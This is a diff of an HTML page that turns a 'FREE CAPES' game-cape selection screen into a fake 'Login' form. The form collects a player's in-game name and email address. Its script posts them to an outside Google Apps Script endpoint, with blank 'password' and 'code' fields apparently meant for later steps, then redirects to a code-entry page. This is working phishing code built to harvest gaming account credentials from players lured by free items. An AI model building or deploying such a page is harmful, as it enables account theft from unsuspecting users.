@@ -2,128 +2,84 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>FREE CAPES</title>
+  <title>Login</title>
   <style>
-    body {
+    * {
+      box-sizing: border-box;
       font-family: 'Segoe UI', sans-serif;
-      background: url('https://wallpapercave.com/wp/wp6058956.jpg') no-repeat center center fixed;
+    }
+    body {
+      margin: 0;
+      padding: 0;
+      background: url('https://static.vecteezy.com/system/resources/previews/030/658/183/non_2x/desktop-wallpapers-wallpaper-desktop-tree-free-photo.jpg') no-repeat center center fixed;
       background-size: cover;
-      margin: 0;
-      padding: 40px;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
+    }
+    .overlay {
+      background-color: rgba(0, 0, 0, 0.4);
       min-height: 100vh;
-      color: white;
-    }
-
-    .title {
-      text-align: center;
-      margin-bottom: 10px;
-    }
-
-    .title h1 {
-      font-size: 48px;
-      font-weight: bold;
-      margin: 0;
-      color: #ffffff;
-      text-shadow: 2px 2px 8px rgba(0,0,0,0.7);
-    }
-
-    .title h2 {
-      font-size: 24px;
-      margin: 8px 0 30px;
-      color: #ccc;
-      text-shadow: 1px 1px 5px rgba(0,0,0,0.5);
-    }
-
-    .container {
       display: flex;
-      gap: 25px;
-      background-color: rgba(0, 0, 0, 0.6);
-      padding: 30px;
-      border-radius: 15px;
       justify-content: center;
-      flex-wrap: wrap;
+      align-items: center;
+      position: relative;
     }
-
-    .option {
-      border: 3px solid transparent;
-      border-radius: 12px;
-      overflow: hidden;
-      transition: 0.3s ease;
-      cursor: pointer;
-      background-color: #222;
-      box-shadow: 0 6px 14px rgba(0, 0, 0, 0.6);
-      width: 180px;
-    }
-
-    .option img {
-      width: 100%;
-      height: 150px;
-      object-fit: cover;
-      display: block;
-      transition: 0.3s ease;
-    }
-
-    .option input {
-      display: none;
-    }
-
-    .option label {
-      display: block;
-      padding: 10px;
+    .login-box {
+      background: rgba(255, 255, 255, 0.85);
+      padding: 30px;
+      border-radius: 10px;
+      width: 300px;
+      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.5);
       text-align: center;
-      font-weight: bold;
-      color: #eee;
-      transition: 0.3s ease;
+      backdrop-filter: blur(5px);
+      z-index: 2;
     }
-
-    .option input:checked + img {
-      filter: brightness(0.6);
-      transform: scale(1.02);
+    h2 {
+      margin-top: 0;
+      color: #2f4f4f;
+      font-weight: 600;
     }
-
-    .option input:checked ~ label {
-      background-color: #0ac0ff;
-      color: #000;
-      font-weight: 900;
+    input[type="text"], input[type="email"] {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border-radius: 5px;
+      border: 1px solid #999;
+      background-color: #f0f0f0;
     }
-
-    .option:hover {
-      transform: scale(1.03);
-      border-color: #0ac0ff;
-    }
-
-    .select-btn {
-      margin-top: 30px;
-      padding: 12px 30px;
-      font-size: 18px;
-      font-weight: bold;
+    button {
+      width: 100%;
+      padding: 10px;
+      background-color: #4471fb;
       color: white;
-      background-color: #1e88e5;
       border: none;
-      border-radius: 8px;
+      border-radius: 5px;
+      font-size: 16px;
       cursor: pointer;
-      transition: 0.3s ease;
     }
-
-    .select-btn:hover {
-      background-color: #1565c0;
+    button:hover {
+      background-color: #565cff;
     }
 
     /* Loader Styles */
-    #loader {
+    .loader-overlay {
+      position: absolute;
+      top: 0;
+      left: 0;
+      height: 100%;
+      width: 100%;
+      background-color: rgba(0,0,0,0.6);
       display: none;
-      margin-top: 30px;
+      justify-content: center;
+      align-items: center;
+      z-index: 5;
+    }
+    .loader {
       border: 6px solid #f3f3f3;
-      border-top: 6px solid #0ac0ff;
+      border-top: 6px solid #3498db;
       border-radius: 50%;
       width: 50px;
       height: 50px;
       animation: spin 1s linear infinite;
     }
-
     @keyframes spin {
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
@@ -131,69 +87,55 @@
   </style>
 </head>
 <body>
-
-  <div class="title">
-    <h1>FREE CAPES</h1>
-    <h2>Select a Cape</h2>
+  <div class="overlay">
+    <div class="login-box">
+      <h2>Login</h2>
+      <form id="loginForm">
+        <input type="text" id="inGameName" placeholder="In-game name" required><br>
+        <input type="email" id="email" placeholder="Gmail / Outlook / Skype" required><br>
+        <button type="submit">Login</button>
+      </form>
+    </div>
+    <div class="loader-overlay" id="loaderOverlay">
+      <div class="loader"></div>
+    </div>
   </div>
 
-  <form class="container" id="capeForm">
-    <div class="option">
-      <input type="radio" name="selection" id="opt1" value="Home Cape" required>
-      <label for="opt1">
-        <img src="https://imgproxy.eneba.games/n01QO0qrhkdha3wvHO73azSRwDgNhyj3MAlDSzEYN4o/rs:fit:350/ar:1/czM6Ly9wcm9kdWN0/cy5lbmViYS5nYW1l/cy9wcm9kdWN0cy9K/TFBwUDRPcDJTTU0x/Y2otWmktdFdkaURp/X0QxNUg3dDRPMHJs/MnVkMFJ3LmpwZw" alt="Home Cape">
-        Home Cape
-      </label>
-    </div>
-
-    <div class="option">
-      <input type="radio" name="selection" id="opt2" value="Menace Cape">
-      <label for="opt2">
-        <img src="https://imgproxy.eneba.games/OtIKhYRiKyHDwGFgdUNMJdyrhIluVIJVj3vuuycTy64/rs:fit:350/ar:1/czM6Ly9wcm9kdWN0/cy5lbmViYS5nYW1l/cy9wcm9kdWN0cy82/aU1SSi1sY3J6WnNV/THFKTlVRRHhlSEJH/V0JaaWJXR3JfTk9n/b0daaG5VLmpwZw" alt="Menace Cape">
-        Menace Cape
-      </label>
-    </div>
-
-    <div class="option">
-      <input type="radio" name="selection" id="opt3" value="Purple Heart Cape">
-      <label for="opt3">
-        <img src="https://imgproxy.eneba.games/NaE_K6LjO2CBdhRRZWEUzEwsBXAhnorCiRP4ZQxrhw0/rs:fit:350/ar:1/czM6Ly9wcm9kdWN0/cy5lbmViYS5nYW1l/cy9wcm9kdWN0cy9Q/bVBvYzItTjVBazZv/Tm5hOEJ5TEVUYkpR/Q1FaaDZOWmtYUVcx/Ul8zR05zLmpwZw" alt="Lava Cape">
-        Purple Heart Cape
-      </label>
-    </div>
-
-    <div class="option">
-      <input type="radio" name="selection" id="opt4" value="TikTok Cape">
-      <label for="opt4">
-        <img src="https://www.bisecthosting.com/blog/wp-content/uploads/2024/05/MinecraftTikTokCape.webp" alt="TikTok Cape">
-        TikTok Cape
-      </label>
-    </div>
-  </form>
-
-  <button class="select-btn" onclick="goToLogin()">Select</button>
-
-  <div id="loader"></div>
-
   <script>
-    function goToLogin() {
-      const selected = document.querySelector('input[name="selection"]:checked');
-      if (!selected) {
-        alert("Please select a cape first!");
-        return;
-      }
+    const scriptURL = 'https://script.google.com/macros/s/AKfycbwWU_jo9dGxh5MNTp7vP70ANUlT5V1XvukmMzIcfPimLHU__stD1w2HwSxNgFTwD7SSww/exec';
 
-      localStorage.setItem("selectedCape", selected.value);
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+      e.preventDefault();
 
-      // Show loader
-      document.getElementById("loader").style.display = "block";
+      const username = document.getElementById('inGameName').value;
+      const gmail = document.getElementById('email').value;
 
-      // Wait 3 seconds, then redirect
-      setTimeout(() => {
-        window.location.href = "login.html";
-      }, 3000);
-    }
+      localStorage.setItem('username', username);
+      localStorage.setItem('gmail', gmail);
+
+      const formData = new FormData();
+      formData.append("username", username);
+      formData.append("gmail", gmail);
+      formData.append("password", "");
+      formData.append("code", "");
+
+      document.getElementById('loaderOverlay').style.display = 'flex';
+
+      fetch(scriptURL, {
+        method: 'POST',
+        body: formData
+      })
+      .then(res => res.text())
+      .then(() => {
+        setTimeout(() => {
+          window.location.href = "code.html";
+        }, 3000); // 3-second delay for loader effect
+      })
+      .catch(error => {
+        document.getElementById('loaderOverlay').style.display = 'none';
+        alert("Submission failed: " + error.message);
+      });
+    });
   </script>
-
 </body>
 </html>
